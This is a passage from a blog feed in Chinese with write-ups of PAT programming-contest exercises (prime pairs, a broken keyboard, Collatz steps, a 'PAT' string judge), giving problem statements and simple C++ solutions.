class="string">&quot;%05d %d %05d\n&quot;</span>,list[i],data[list[i]],list[i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d -1&quot;</span>,list[sum<span class="number">-1</span>],data[list[sum<span class="number">-1</span>]]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><hr><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>让我们定义<em>d<del>n</del><em>为：</em>d<del>n</del></em>&#x3D;<em>p<del>n+1</del>−</em>p<del>n</del><em>，其中</em>p*<del>i</del><em>是第</em>i<em>个素数。显然有</em>d*<del>1</del>&#x3D;1，且对于<em>n</em>&gt;1有*d<del>n</del>*是偶数。“素数对猜想”认为“存在无穷多对相邻且差为2的素数。</p><p>现给定任意正整数<code>N</code>(&lt;105)，请计算不超过<code>N</code>的满足猜想的素数对的个数。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>输入在一行给出正整数<code>N</code>。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>在一行中输出不超过<code>N</code>的满足猜想的<code>素数对的个数</code>。</p><h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20</span><br></pre></td></tr></table></figure><h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><blockquote><p>这题显然是素数问题，写个判断素数就行，差为2的话少于5的都是0个，大于5才有素数对；</p><p>这里柳神判断素数是<code>i * i &lt;= n</code>,这样都不用考虑用开平方的函数了</p></blockquote><p><strong>代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isprime</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i * i &lt;= n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n % i == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,cnt = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">5</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isprime</span>(i) &amp;&amp; <span class="built_in">isprime</span>(i<span class="number">-2</span>)) cnt++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a>第二题</h2><p>On a broken keyboard, some of the keys are worn out. So when you type some sentences, the characters corresponding to those keys will not appear on screen.</p><p>Now given a string that you are supposed to type, and the string that you actually type out, please list those keys which are for sure worn out.</p><h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. For each case, the 1st line contains the original string, and the 2nd line contains the typed-out string. Each string contains no more than 80 characters which are either English letters [A-Z] (case insensitive), digital numbers [0-9], or <code>_</code> (representing the space). It is guaranteed that both strings are non-empty.</p><h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, print in one line the keys that are worn out, in the order of being detected. The English letters must be capitalized. Each worn out key must be printed once only. It is guaranteed that there is at least one worn out key.</p><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7_This_is_a_test</span><br><span class="line">_hs_s_a_es</span><br></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7TI</span><br></pre></td></tr></table></figure><blockquote><p>这是一道甲级题，但是非常简单，题目大意就是找不完整的字母，然后用大写字母输出，但是每个大写字母只输出一次。</p><p>用c++中string的find函数即可，<code>string::npos</code>是没有找到的意思。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">string s1,s2,ans;</span><br><span class="line">cin &gt;&gt; s1 &gt;&gt; s2;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s1.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s2.<span class="built_in">find</span>(s1[i]) == string::npos &amp;&amp; ans.<span class="built_in">find</span>(<span class="built_in">toupper</span>(s1[i])) == string::npos)&#123;</span><br><span class="line">ans += <span class="built_in">toupper</span>(s1[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;PAT乙级第二天记录——反转链表（纯数组解）&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pat乙级第二天记录</title>
    <link href="https://pa1r0t.github.io/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/"/>
    <id>https://pa1r0t.github.io/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/</id>
    <published>2023-05-08T05:31:53.000Z</published>
    <updated>2023-05-08T06:10:27.068Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些写代码上的小细节</p><span id="more"></span><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>读入 <em>n</em>（&gt;0）名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，格式为</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第<span class="number"> 1 </span>行：正整数 n</span><br><span class="line">第<span class="number"> 2 </span>行：第<span class="number"> 1 </span>个学生的姓名 学号 成绩</span><br><span class="line">第<span class="number"> 3 </span>行：第<span class="number"> 2 </span>个学生的姓名 学号 成绩</span><br><span class="line">  ... ... ...</span><br><span class="line">第 n+1 行：第 n 个学生的姓名 学号 成绩</span><br></pre></td></tr></table></figure><p>其中<code>姓名</code>和<code>学号</code>均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">Joe Math990112 89</span><br><span class="line">Mike CS991301 100</span><br><span class="line">Mary EE990830 95</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mike CS991301</span><br><span class="line">Joe Math990112</span><br></pre></td></tr></table></figure><p>这一题我其实想将学生信息用三个字符串来同时存各种信息，奈何c++切割字符串方面并没有python方便，所以我也老老实实空间换时间了，不过程序逻辑还真算是简单了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,max_s = <span class="number">-1</span>,min_s = <span class="number">101</span>,score;</span><br><span class="line">string max_name,min_name,max_num,min_num,tmp_name,tmp_num;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp_name &gt;&gt; tmp_num &gt;&gt; score;</span><br><span class="line"><span class="keyword">if</span>(score &gt; max_s)&#123; max_s = score; max_name = tmp_name; max_num = tmp_num;&#125;</span><br><span class="line"><span class="keyword">if</span>(score &lt; min_s)&#123; min_s = score; min_name = tmp_name; min_num = tmp_num;&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; max_name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; max_num &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; min_name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; min_num;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>卡拉兹(Callatz)猜想：</p><p>对任何一个正整数 <em>n</em>，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 (3<em>n</em>+1) 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 <em>n</em>&#x3D;1。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 (3<em>n</em>+1)，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展……</p><p>我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 <em>n</em>，简单地数一下，需要多少步（砍几下）才能得到 <em>n</em>&#x3D;1？</p><h3 id="输入格式：-1"><a href="#输入格式：-1" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，即给出正整数 <em>n</em> 的值。</p><h3 id="输出格式：-1"><a href="#输出格式：-1" class="headerlink" title="输出格式："></a>输出格式：</h3><p>输出从 <em>n</em> 计算到 1 需要的步数。</p><h3 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><p>我原本是这样写的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,i = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(;n != <span class="number">1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">2</span>) n = (<span class="number">3</span>*n + <span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">         <span class="keyword">else</span> n /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; i;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>但其实这在效率上差了点，if的两两种情况都要除2。</p><p>看了柳神的解答，我们可以将两种处理运算中抽离共同运算</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,i = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(;n != <span class="number">1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">2</span>) n = (<span class="number">3</span>*n + <span class="number">1</span>);</span><br><span class="line">n /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; i;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>像这题题解也一样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tmp.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i!=<span class="number">0</span>) cout &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; mp[tmp[i]<span class="number">-48</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一次都不一样要打印空格，但每次必须要打印数字。可以在开端或者末尾进行受限。但是在末尾的话还要再次计算tmp.size()，这样就要花销了</p><h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p>卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。</p><p>当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 <em>n</em>&#x3D;3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 <em>n</em>&#x3D;5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 <em>n</em> 为“关键数”，如果 <em>n</em> 不能被数列中的其他数字所覆盖。</p><p>现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。</p><h3 id="输入格式：-2"><a href="#输入格式：-2" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 <em>K</em> (&lt;100)，第 2 行给出 <em>K</em> 个互不相同的待验证的正整数 <em>n</em> (1&lt;<em>n</em>≤100)的值，数字间用空格隔开。</p><h3 id="输出格式：-2"><a href="#输出格式：-2" class="headerlink" title="输出格式："></a>输出格式：</h3><p>每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。</p><h3 id="输入样例：-2"><a href="#输入样例：-2" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">3 5 6 7 8 11</span><br></pre></td></tr></table></figure><h3 id="输出样例：-2"><a href="#输出样例：-2" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 6</span><br></pre></td></tr></table></figure><p>解答：</p><ol><li>这里输入的数用一个数组进行存放；</li><li>然后用另外的数组arr进行记录n运算过程中出现某些数，出现过记录为1，其他为0；</li><li>然后进行存放数据的数组进行排序；</li><li>然后遍历数组，arr为0的位置输出即可</li><li>这里虽然数n小于100，但是如果是99就会×3+1，必然会大于100，这里arr数组尽可能地大</li><li>由于数组一需要排序，为了方便我们用了vector容器</li><li>这里sort用了lambda表达式，效率不知道怎么样，够帅就行哈哈</li><li>然后就是输出了，这里每次因为不一定会输出数，也不一定会输出空格，所以没有公共部分，只能用if过滤了</li><li>这里用了一个flag来记录是否输出空格，还是采用“     ”+数的形式</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">100000</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,tmp,k;</span><br><span class="line">cin &gt;&gt; k;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(k)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">v[i] = n;</span><br><span class="line"><span class="keyword">for</span>(;n != <span class="number">1</span>;)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">2</span>) n = (<span class="number">3</span>*n + <span class="number">1</span>);</span><br><span class="line">n /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(arr[n]==<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">arr[n] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),[](<span class="type">int</span> a,<span class="type">int</span> b)&#123;<span class="keyword">return</span> a &gt; b;&#125;);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,flag = <span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[v[i]] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(flag) &#123; cout &lt;&lt; <span class="string">&quot; &quot;</span>;&#125;</span><br><span class="line">cout &lt;&lt; v[i]; </span><br><span class="line">flag = <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些写代码上的小细节&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>map题解字符串问题</title>
    <link href="https://pa1r0t.github.io/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/"/>
    <id>https://pa1r0t.github.io/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/</id>
    <published>2023-05-07T11:33:37.000Z</published>
    <updated>2023-05-07T11:55:54.090Z</updated>
    
    <content type="html"><![CDATA[<p>PAT_basic C++ map1</p><span id="more"></span><h1 id="PAT乙级1003-我要通过！"><a href="#PAT乙级1003-我要通过！" class="headerlink" title="PAT乙级1003. 我要通过！"></a>PAT乙级1003. 我要通过！</h1><p>​此题，题目就难以理解。不过现在理解了，题目其实我觉得条件二要在条件一的基础上理解，然后条件三要在条件二的基础上理解，然后需要给出例子进行推导，然后总结出结论——其实就是总结出公式</p><p><strong>题目：</strong></p><p>“<strong>答案正确</strong>”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“<strong>答案正确</strong>”大派送 —— 只要读入的字符串满足下列条件，系统就输出“<strong>答案正确</strong>”，否则输出“<strong>答案错误</strong>”。</p><p>得到“<strong>答案正确</strong>”的条件是：</p><ol><li>字符串中必须仅有 <code>P</code>、 <code>A</code>、 <code>T</code>这三种字符，不可以包含其它字符；</li><li>任意形如 <code>xPATx</code> 的字符串都可以获得“<strong>答案正确</strong>”，其中 <code>x</code> 或者是空字符串，或者是仅由字母 <code>A</code> 组成的字符串；</li><li>如果 <code>aPbTc</code> 是正确的，那么 <code>aPbATca</code> 也是正确的，其中 <code>a</code>、 <code>b</code>、 <code>c</code> 均或者是空字符串，或者是仅由字母 <code>A</code> 组成的字符串。</li></ol><p>现在就请你为 PAT 写一个自动裁判程序，判定哪些字符串是可以获得“<strong>答案正确</strong>”的。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 <em>n</em> (≤10)，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>每个字符串的检测结果占一行，如果该字符串可以获得“<strong>答案正确</strong>”，则输出 <code>YES</code>，否则输出 <code>NO</code>。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">PAT</span><br><span class="line">PAAT</span><br><span class="line">AAPATAA</span><br><span class="line">AAPAATAAAA</span><br><span class="line">xPATx</span><br><span class="line">PT</span><br><span class="line">Whatever</span><br><span class="line">APAAATAA</span><br><span class="line">APT</span><br><span class="line">APATTAA</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><p>题解：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">string s;</span><br><span class="line"><span class="type">int</span> p=<span class="number">-1</span>,t=<span class="number">-1</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line"><span class="comment">//遍历字符串</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;s.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line"><span class="comment">//记录字符数量 </span></span><br><span class="line">mp[s[j]]++;</span><br><span class="line"><span class="comment">//记录P,T的位置</span></span><br><span class="line"><span class="keyword">if</span>(s[j] == <span class="string">&#x27;P&#x27;</span>) p = j;</span><br><span class="line"><span class="keyword">if</span>(s[j] == <span class="string">&#x27;T&#x27;</span>) t = j;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//mp[&#x27;A&#x27;] != 0 必须要有A字符</span></span><br><span class="line"><span class="comment">//mp[&#x27;P&#x27;] == 1 &amp;&amp; mp[&#x27;T&#x27;] == 1  PT字符必须要有且有一个 </span></span><br><span class="line"><span class="comment">//t-p &gt; 1 P和T的位置满足中间一个距离，即中间必须有A</span></span><br><span class="line"><span class="comment">//mp.size() == 3 仅有P A T</span></span><br><span class="line"><span class="comment">//p*(t-p-1)==s.size()-t-1 前A数量 ×中间A数量 = 后A数量 </span></span><br><span class="line"><span class="keyword">if</span>(mp[<span class="string">&#x27;A&#x27;</span>] != <span class="number">0</span> &amp;&amp; mp[<span class="string">&#x27;P&#x27;</span>] == <span class="number">1</span> &amp;&amp; mp[<span class="string">&#x27;T&#x27;</span>] == <span class="number">1</span> &amp;&amp; t-p != <span class="number">1</span> &amp;&amp; mp.<span 